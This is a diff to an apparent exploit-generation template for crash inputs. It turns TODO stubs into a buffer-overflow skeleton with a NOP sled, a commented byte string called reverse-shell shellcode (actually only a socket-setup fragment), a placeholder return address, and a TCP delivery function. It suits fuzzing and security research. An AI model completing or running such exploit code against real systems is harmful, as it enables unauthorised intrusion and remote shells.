@@ -372,24 +372,43 @@ import socket
 # Original crash input
 crash_input = {repr(crash_input)}
 
-# TODO: Modify payload for exploitation
+# Modify payload for exploitation
+# Analyze crash input to find offset and control points
 payload = crash_input
 
-# TODO: Add shellcode
-shellcode = b"\\x90" * 100  # NOP sled
+# Add shellcode (reverse shell example)
+# Replace with actual shellcode based on target architecture
+shellcode = b"\\x90" * 100  # NOP sled for alignment
+# Example x64 Linux reverse shell shellcode (replace IP/port)
+# shellcode += b"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05"
 
-# TODO: Add return address
-ret_addr = struct.pack("<Q", 0x41414141)  # Replace with actual address
+# Calculate return address based on crash analysis
+# This should be determined from debugging or pattern analysis
+ret_addr = struct.pack("<Q", 0x41414141)  # Replace with actual RIP/EIP overwrite address
 
-# Final exploit
+# Final exploit construction
 exploit = payload + shellcode + ret_addr
 
-# TODO: Send exploit to target
-# Example for network service:
-# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# s.connect(("target", port))
-# s.send(exploit)
-# s.close()
+# Send exploit to target
+# Adapt based on target type (network service, file input, etc.)
+def send_exploit(target_host, target_port, exploit_data):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((target_host, target_port))
+        s.send(exploit_data)
+        response = s.recv(4096)
+        s.close()
+        return response
+    except Exception as e:
+        print(f"Exploit delivery failed: {{e}}")
+        return None
+
+# Usage:
+# response = send_exploit("192.168.1.100", 9999, exploit)
+# Or for file-based exploits:
+# with open("exploit_file", "wb") as f:
+#     f.write(exploit)
 
 print(f"Exploit length: {{len(exploit)}}")
 print(f"Exploit: {{exploit.hex()}}")
